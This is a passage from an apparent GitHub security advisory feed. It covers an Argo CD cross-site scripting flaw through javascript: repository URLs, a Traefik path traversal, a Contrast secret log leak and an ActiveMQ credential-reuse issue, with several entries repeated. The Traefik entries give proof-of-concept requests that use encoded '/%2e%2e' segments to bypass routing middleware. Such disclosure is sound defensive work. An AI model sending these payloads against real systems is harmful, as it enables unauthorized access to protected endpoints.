<p>In <code>ui/src/app/shared/components/urls.ts</code>, the following code exists to parse the repository URL.</p>
<p><a href="https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26</a></p>
<p>Since this code doesn't validate the protocol of repository URLs, it's possible to inject <code>javascript:</code> URLs here.</p>
<p><a href="https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7</a></p>
<p>As the return value of this function is used in the <code>href</code> attribute of the <code>a</code> tag, it's possible to achieve cross-site scripting by using <code>javascript:</code> URLs.</p>
<p>Browsers may return the proper hostname for <code>javascript:</code> URLs, allowing exploitation of this vulnerability.</p>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<ul>
<li>v3.0.4</li>
<li>v2.14.13</li>
<li>v2.13.8</li>
</ul>
<p>The patch incorporates a way to validate the URL being passed in. Returning <code>null</code> if the validation fails.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no workarounds other than depending on the browser to filter the URL. </p>
<h3 id="credits">Credits</h3>
<p>Disclosed by @Ry0taK <a href="https://ryotak.net">RyotaK</a>. </p>
<h3 id="for-more-information">For more information</h3>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1">https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1</a></li>
<li><a href="https://github.com/advisories/GHSA-2hj5-g64g-fp6p">https://github.com/advisories/GHSA-2hj5-g64g-fp6p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2hj5-g64g-fp6p</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-05-28T17:36:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Argo CD allows cross-site scripting on repositories page]]></title>
        <id>https://github.com/advisories/GHSA-2hj5-g64g-fp6p</id>
        <link href="https://github.com/advisories/GHSA-2hj5-g64g-fp6p"/>
        <updated>2025-05-28T17:36:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker to perform arbitrary actions on behalf of the victim via the API, such as creating, modifying, and deleting Kubernetes resources. Due to the improper filtering of URL protocols in the repository page, an attacker can achieve cross-site scripting with permission to edit the repository.</p>
<p>In <code>ui/src/app/shared/components/urls.ts</code>, the following code exists to parse the repository URL.</p>
<p><a href="https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26</a></p>
<p>Since this code doesn't validate the protocol of repository URLs, it's possible to inject <code>javascript:</code> URLs here.</p>
<p><a href="https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7</a></p>
<p>As the return value of this function is used in the <code>href</code> attribute of the <code>a</code> tag, it's possible to achieve cross-site scripting by using <code>javascript:</code> URLs.</p>
<p>Browsers may return the proper hostname for <code>javascript:</code> URLs, allowing exploitation of this vulnerability.</p>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<ul>
<li>v3.0.4</li>
<li>v2.14.13</li>
<li>v2.13.8</li>
</ul>
<p>The patch incorporates a way to validate the URL being passed in. Returning <code>null</code> if the validation fails.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no workarounds other than depending on the browser to filter the URL. </p>
<h3 id="credits">Credits</h3>
<p>Disclosed by @Ry0taK <a href="https://ryotak.net">RyotaK</a>. </p>
<h3 id="for-more-information">For more information</h3>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1">https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1</a></li>
<li><a href="https://github.com/advisories/GHSA-2hj5-g64g-fp6p">https://github.com/advisories/GHSA-2hj5-g64g-fp6p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2hj5-g64g-fp6p</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-05-28T17:36:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Argo CD allows cross-site scripting on repositories page]]></title>
        <id>https://github.com/advisories/GHSA-2hj5-g64g-fp6p</id>
        <link href="https://github.com/advisories/GHSA-2hj5-g64g-fp6p"/>
        <updated>2025-05-28T17:36:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker to perform arbitrary actions on behalf of the victim via the API, such as creating, modifying, and deleting Kubernetes resources. Due to the improper filtering of URL protocols in the repository page, an attacker can achieve cross-site scripting with permission to edit the repository.</p>
<p>In <code>ui/src/app/shared/components/urls.ts</code>, the following code exists to parse the repository URL.</p>
<p><a href="https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26</a></p>
<p>Since this code doesn't validate the protocol of repository URLs, it's possible to inject <code>javascript:</code> URLs here.</p>
<p><a href="https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7</a></p>
<p>As the return value of this function is used in the <code>href</code> attribute of the <code>a</code> tag, it's possible to achieve cross-site scripting by using <code>javascript:</code> URLs.</p>
<p>Browsers may return the proper hostname for <code>javascript:</code> URLs, allowing exploitation of this vulnerability.</p>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<ul>
<li>v3.0.4</li>
<li>v2.14.13</li>
<li>v2.13.8</li>
</ul>
<p>The patch incorporates a way to validate the URL being passed in. Returning <code>null</code> if the validation fails.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no workarounds other than depending on the browser to filter the URL. </p>
<h3 id="credits">Credits</h3>
<p>Disclosed by @Ry0taK <a href="https://ryotak.net">RyotaK</a>. </p>
<h3 id="for-more-information">For more information</h3>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1">https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1</a></li>
<li><a href="https://github.com/advisories/GHSA-2hj5-g64g-fp6p">https://github.com/advisories/GHSA-2hj5-g64g-fp6p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2hj5-g64g-fp6p</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-05-28T17:36:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd] Argo CD allows cross-site scripting on repositories page]]></title>
        <id>https://github.com/advisories/GHSA-2hj5-g64g-fp6p</id>
        <link href="https://github.com/advisories/GHSA-2hj5-g64g-fp6p"/>
        <updated>2025-05-28T17:36:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker to perform arbitrary actions on behalf of the victim via the API, such as creating, modifying, and deleting Kubernetes resources. Due to the improper filtering of URL protocols in the repository page, an attacker can achieve cross-site scripting with permission to edit the repository.</p>
<p>In <code>ui/src/app/shared/components/urls.ts</code>, the following code exists to parse the repository URL.</p>
<p><a href="https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/urls.ts#L14-L26</a></p>
<p>Since this code doesn't validate the protocol of repository URLs, it's possible to inject <code>javascript:</code> URLs here.</p>
<p><a href="https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7">https://github.com/argoproj/argo-cd/blob/0ae5882d5ae9fe88efc51f65ca8543fb8c3a0aa1/ui/src/app/shared/components/repo.tsx#L5-L7</a></p>
<p>As the return value of this function is used in the <code>href</code> attribute of the <code>a</code> tag, it's possible to achieve cross-site scripting by using <code>javascript:</code> URLs.</p>
<p>Browsers may return the proper hostname for <code>javascript:</code> URLs, allowing exploitation of this vulnerability.</p>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<ul>
<li>v3.0.4</li>
<li>v2.14.13</li>
<li>v2.13.8</li>
</ul>
<p>The patch incorporates a way to validate the URL being passed in. Returning <code>null</code> if the validation fails.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no workarounds other than depending on the browser to filter the URL. </p>
<h3 id="credits">Credits</h3>
<p>Disclosed by @Ry0taK <a href="https://ryotak.net">RyotaK</a>. </p>
<h3 id="for-more-information">For more information</h3>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1">https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1</a></li>
<li><a href="https://github.com/advisories/GHSA-2hj5-g64g-fp6p">https://github.com/advisories/GHSA-2hj5-g64g-fp6p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2hj5-g64g-fp6p</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-05-28T17:36:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/edgelesssys/contrast] Contrast workload secrets leak to logs on INFO level]]></title>
        <id>https://github.com/advisories/GHSA-h5f8-crrq-4pw8</id>
        <link href="https://github.com/advisories/GHSA-h5f8-crrq-4pw8"/>
        <updated>2025-05-28T14:40:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When the Contrast initializer is configured with a <code>CONTRAST_LOG_LEVEL</code> of <code>info</code> or <code>debug</code>, the workload secret is logged to <code>stderr</code> and written to Kubernetes logs. </p>
<p>Since <code>info</code> is the default setting, this affects all Contrast installations that don't customize their initializers' log level.</p>
<p>The following audiences are <strong>intended</strong> to have access to workload secrets (see <a href="https://docs.edgeless.systems/contrast/1.7/architecture/secrets#workload-secrets">https://docs.edgeless.systems/contrast/1.7/architecture/secrets#workload-secrets</a>):</p>
<ul>
<li>Contrast Coordinator (can derive all workload secrets)</li>
<li>Contrast Initializer (obtains only the secret configured in the manifest)</li>
<li>Seedshare owner (can derive all workload secrets)</li>
<li>Workload owner (can update manifests to obtain secrets)</li>
</ul>
<p>This vulnerability allows the following parties <strong>unintended access</strong> to workload secrets issued by a Coordinator:</p>
<ul>
<li>Kubernetes users with <code>get</code> or <code>list</code> permission on <code>pods/logs</code>.</li>
<li>Others with read access to the Kubernetes log storage (most notably, the cloud provider).</li>
</ul>
<p>This vulnerability <strong>does not affect</strong> scenarios where workload secrets are not used by the application (directly or with <a href="https://docs.edgeless.systems/contrast/1.7/architecture/secrets#secure-persistence">secure persistence</a>). Applications designed for workload owner exclusion can't use workload secrets and are thus unaffected.</p>
<h3 id="patches">Patches</h3>
<p>N/A</p>
<h3 id="workarounds">Workarounds</h3>
<p>This vulnerability can be mitigated by adding an environment variable <code>CONTRAST_LOG_LEVEL=warn</code> to the initializer after running <code>contrast generate</code>, and then running <code>contrast generate</code> again.</p>
<h3 id="references">References</h3>
<p>N/A</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/edgelesssys/contrast/security/advisories/GHSA-h5f8-crrq-4pw8">https://github.com/edgelesssys/contrast/security/advisories/GHSA-h5f8-crrq-4pw8</a></li>
<li><a href="https://github.com/advisories/GHSA-h5f8-crrq-4pw8">https://github.com/advisories/GHSA-h5f8-crrq-4pw8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h5f8-crrq-4pw8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-28T14:40:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/traefik/traefik] Traefik allows path traversal using url encoding]]></title>
        <id>https://github.com/advisories/GHSA-vrch-868g-9jx5</id>
        <link href="https://github.com/advisories/GHSA-vrch-868g-9jx5"/>
        <updated>2025-05-28T14:25:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>There is a potential vulnerability in Traefik managing the requests using a <code>PathPrefix</code>, <code>Path</code> or <code>PathRegex</code> matcher.</p>
<p>When Traefik is configured to route the requests to a backend using a matcher based on the path, if the URL contains a URL encoded string in its path, itâ€™s possible to target a backend, exposed using another router, by-passing the middlewares chain.</p>
<h2 id="example">Example</h2>
<pre><code class="language-yaml">apiVersion: traefik.io/v1alpha1
kind: IngressRoute
metadata:
  name: my-service
spec:
  routes:
    - match: PathPrefix(â€˜/serviceâ€™)
      kind: Rule
      services:
        - name: service-a
          port: 8080
      middlewares:
        - name: my-middleware-a
    - match: PathPrefix(â€˜/service/sub-pathâ€™)
      kind: Rule
      services:
        - name: service-a
          port: 8080
</code></pre>
<p>In such a case, the request <code>http://mydomain.example.com/service/sub-path/%2e%2e/other-path</code> will reach the backend <code>my-service-a</code> without operating the middleware <code>my-middleware-a</code> unless the computed path is <code>http://mydomain.example.com/service/other-path</code> and should be computes by the first router (operating <code>my-middleware-a</code>).</p>
<h2 id="patches">Patches</h2>
<ul>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.25">https://github.com/traefik/traefik/releases/tag/v2.11.25</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.4.1">https://github.com/traefik/traefik/releases/tag/v3.4.1</a></li>
</ul>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
<details>
<summary>Original Description</summary>
### Summary

<p>Path traversal with "/../" using URL encodings ("/%2e%2e") allows for circumventing routing rules. </p>
<h3 id="details">Details</h3>
<p>When having defined a route, you can path traverse using the URL encoded variant of /../ and reach endpoints that are not made publicly available. This issue has been found and fixed earlier with regular /../ and has been fixed in this CVE. This URL encoding trick works around that
<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32431">https://nvd.nist.gov/vuln/detail/CVE-2025-32431</a></p>
<p>Simply implementing a check on the URL encoding won't be sufficient as path traversal can take numerous formats. See examples here:
<a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html">https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html</a></p>
<h3 id="poc">PoC</h3>
<p>Setup a service with two endpoints: "/public" and "/private", which returns a 200 OK for both
Setup a Traefik proxy with a single route which points to the service using path /public</p>
<p>Regular requests to traefik /public will return 200 OK and to /private should return 404 (response by Traefik)
When making a request to /public/%2e%2e/private you should receive a 200 OK.</p>
<h3 id="impact-1">Impact</h3>
<p>Impacts all traefik implementations with path prefix routes that expose only part of the downstream api</p>
<h3 id="suggestion">Suggestion</h3>
<p>Provide configuration property which disables all path traversals. Steps:</p>
<ol>
<li>Decode URL</li>
<li>Evaluate and construct relative path (do traversal before route evaluation)</li>
<li>Compare relative/evaluated path to configured routes (PathPrefix/pathRegexp)</li></ol></details>

<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-vrch-868g-9jx5">https://github.com/traefik/traefik/security/advisories/GHSA-vrch-868g-9jx5</a></li>
<li><a href="https://github.com/traefik/traefik/commit/08d5dfee0164aa54dd44a467870042e18e8d3f00">https://github.com/traefik/traefik/commit/08d5dfee0164aa54dd44a467870042e18e8d3f00</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.25">https://github.com/traefik/traefik/releases/tag/v2.11.25</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.4.1">https://github.com/traefik/traefik/releases/tag/v3.4.1</a></li>
<li><a href="https://github.com/advisories/GHSA-vrch-868g-9jx5">https://github.com/advisories/GHSA-vrch-868g-9jx5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vrch-868g-9jx5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-05-28T14:25:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/traefik/traefik/v2] Traefik allows path traversal using url encoding]]></title>
        <id>https://github.com/advisories/GHSA-vrch-868g-9jx5</id>
        <link href="https://github.com/advisories/GHSA-vrch-868g-9jx5"/>
        <updated>2025-05-28T14:25:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>There is a potential vulnerability in Traefik managing the requests using a <code>PathPrefix</code>, <code>Path</code> or <code>PathRegex</code> matcher.</p>
<p>When Traefik is configured to route the requests to a backend using a matcher based on the path, if the URL contains a URL encoded string in its path, itâ€™s possible to target a backend, exposed using another router, by-passing the middlewares chain.</p>
<h2 id="example">Example</h2>
<pre><code class="language-yaml">apiVersion: traefik.io/v1alpha1
kind: IngressRoute
metadata:
  name: my-service
spec:
  routes:
    - match: PathPrefix(â€˜/serviceâ€™)
      kind: Rule
      services:
        - name: service-a
          port: 8080
      middlewares:
        - name: my-middleware-a
    - match: PathPrefix(â€˜/service/sub-pathâ€™)
      kind: Rule
      services:
        - name: service-a
          port: 8080
</code></pre>
<p>In such a case, the request <code>http://mydomain.example.com/service/sub-path/%2e%2e/other-path</code> will reach the backend <code>my-service-a</code> without operating the middleware <code>my-middleware-a</code> unless the computed path is <code>http://mydomain.example.com/service/other-path</code> and should be computes by the first router (operating <code>my-middleware-a</code>).</p>
<h2 id="patches">Patches</h2>
<ul>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.25">https://github.com/traefik/traefik/releases/tag/v2.11.25</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.4.1">https://github.com/traefik/traefik/releases/tag/v3.4.1</a></li>
</ul>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
<details>
<summary>Original Description</summary>
### Summary

<p>Path traversal with "/../" using URL encodings ("/%2e%2e") allows for circumventing routing rules. </p>
<h3 id="details">Details</h3>
<p>When having defined a route, you can path traverse using the URL encoded variant of /../ and reach endpoints that are not made publicly available. This issue has been found and fixed earlier with regular /../ and has been fixed in this CVE. This URL encoding trick works around that
<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32431">https://nvd.nist.gov/vuln/detail/CVE-2025-32431</a></p>
<p>Simply implementing a check on the URL encoding won't be sufficient as path traversal can take numerous formats. See examples here:
<a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html">https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html</a></p>
<h3 id="poc">PoC</h3>
<p>Setup a service with two endpoints: "/public" and "/private", which returns a 200 OK for both
Setup a Traefik proxy with a single route which points to the service using path /public</p>
<p>Regular requests to traefik /public will return 200 OK and to /private should return 404 (response by Traefik)
When making a request to /public/%2e%2e/private you should receive a 200 OK.</p>
<h3 id="impact-1">Impact</h3>
<p>Impacts all traefik implementations with path prefix routes that expose only part of the downstream api</p>
<h3 id="suggestion">Suggestion</h3>
<p>Provide configuration property which disables all path traversals. Steps:</p>
<ol>
<li>Decode URL</li>
<li>Evaluate and construct relative path (do traversal before route evaluation)</li>
<li>Compare relative/evaluated path to configured routes (PathPrefix/pathRegexp)</li></ol></details>

<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-vrch-868g-9jx5">https://github.com/traefik/traefik/security/advisories/GHSA-vrch-868g-9jx5</a></li>
<li><a href="https://github.com/traefik/traefik/commit/08d5dfee0164aa54dd44a467870042e18e8d3f00">https://github.com/traefik/traefik/commit/08d5dfee0164aa54dd44a467870042e18e8d3f00</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.25">https://github.com/traefik/traefik/releases/tag/v2.11.25</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.4.1">https://github.com/traefik/traefik/releases/tag/v3.4.1</a></li>
<li><a href="https://github.com/advisories/GHSA-vrch-868g-9jx5">https://github.com/advisories/GHSA-vrch-868g-9jx5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vrch-868g-9jx5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-05-28T14:25:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/traefik/traefik/v3] Traefik allows path traversal using url encoding]]></title>
        <id>https://github.com/advisories/GHSA-vrch-868g-9jx5</id>
        <link href="https://github.com/advisories/GHSA-vrch-868g-9jx5"/>
        <updated>2025-05-28T14:25:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>There is a potential vulnerability in Traefik managing the requests using a <code>PathPrefix</code>, <code>Path</code> or <code>PathRegex</code> matcher.</p>
<p>When Traefik is configured to route the requests to a backend using a matcher based on the path, if the URL contains a URL encoded string in its path, itâ€™s possible to target a backend, exposed using another router, by-passing the middlewares chain.</p>
<h2 id="example">Example</h2>
<pre><code class="language-yaml">apiVersion: traefik.io/v1alpha1
kind: IngressRoute
metadata:
  name: my-service
spec:
  routes:
    - match: PathPrefix(â€˜/serviceâ€™)
      kind: Rule
      services:
        - name: service-a
          port: 8080
      middlewares:
        - name: my-middleware-a
    - match: PathPrefix(â€˜/service/sub-pathâ€™)
      kind: Rule
      services:
        - name: service-a
          port: 8080
</code></pre>
<p>In such a case, the request <code>http://mydomain.example.com/service/sub-path/%2e%2e/other-path</code> will reach the backend <code>my-service-a</code> without operating the middleware <code>my-middleware-a</code> unless the computed path is <code>http://mydomain.example.com/service/other-path</code> and should be computes by the first router (operating <code>my-middleware-a</code>).</p>
<h2 id="patches">Patches</h2>
<ul>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.25">https://github.com/traefik/traefik/releases/tag/v2.11.25</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.4.1">https://github.com/traefik/traefik/releases/tag/v3.4.1</a></li>
</ul>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
<details>
<summary>Original Description</summary>
### Summary

<p>Path traversal with "/../" using URL encodings ("/%2e%2e") allows for circumventing routing rules. </p>
<h3 id="details">Details</h3>
<p>When having defined a route, you can path traverse using the URL encoded variant of /../ and reach endpoints that are not made publicly available. This issue has been found and fixed earlier with regular /../ and has been fixed in this CVE. This URL encoding trick works around that
<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32431">https://nvd.nist.gov/vuln/detail/CVE-2025-32431</a></p>
<p>Simply implementing a check on the URL encoding won't be sufficient as path traversal can take numerous formats. See examples here:
<a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html">https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html</a></p>
<h3 id="poc">PoC</h3>
<p>Setup a service with two endpoints: "/public" and "/private", which returns a 200 OK for both
Setup a Traefik proxy with a single route which points to the service using path /public</p>
<p>Regular requests to traefik /public will return 200 OK and to /private should return 404 (response by Traefik)
When making a request to /public/%2e%2e/private you should receive a 200 OK.</p>
<h3 id="impact-1">Impact</h3>
<p>Impacts all traefik implementations with path prefix routes that expose only part of the downstream api</p>
<h3 id="suggestion">Suggestion</h3>
<p>Provide configuration property which disables all path traversals. Steps:</p>
<ol>
<li>Decode URL</li>
<li>Evaluate and construct relative path (do traversal before route evaluation)</li>
<li>Compare relative/evaluated path to configured routes (PathPrefix/pathRegexp)</li></ol></details>

<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-vrch-868g-9jx5">https://github.com/traefik/traefik/security/advisories/GHSA-vrch-868g-9jx5</a></li>
<li><a href="https://github.com/traefik/traefik/commit/08d5dfee0164aa54dd44a467870042e18e8d3f00">https://github.com/traefik/traefik/commit/08d5dfee0164aa54dd44a467870042e18e8d3f00</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.25">https://github.com/traefik/traefik/releases/tag/v2.11.25</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.4.1">https://github.com/traefik/traefik/releases/tag/v3.4.1</a></li>
<li><a href="https://github.com/advisories/GHSA-vrch-868g-9jx5">https://github.com/advisories/GHSA-vrch-868g-9jx5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vrch-868g-9jx5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-05-28T14:25:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/arkmq-org/activemq-artemis-operator] ActiveMQ Artemis AMQ Broker Operator Starting Credentials Reuse]]></title>
        <id>https://github.com/advisories/GHSA-q5q7-8x6x-hcg2</id>
        <link href="https://github.com/advisories/GHSA-q5q7-8x6x-hcg2"/>
        <updated>2025-05-27T22:50:23.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in ActiveMQ Artemis. The password generated by activemq-artemis-operator does not regenerate between separated CR dependencies.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-4057">https://nvd.nist.gov/vuln/detail/CVE-2025-4057</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-4057">https://access.redhat.com/security/cve/CVE-2025-4057</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2362827">https://bugzilla.redhat.com/show_bug.cgi?id=2362827</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:8147">https://access.redhat.com/errata/RHSA-2025:8147</a></li>
<li><a href="https://github.com/advisories/GHSA-q5q7-8x6x-hcg2">https://github.com/advisories/GHSA-q5q7-8x6x-hcg2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q5q7-8x6x-hcg2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-26T12:30:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/concourse/concourse] GitLab auth uses full name instead of username as user ID, allowing impersonation]]></title>
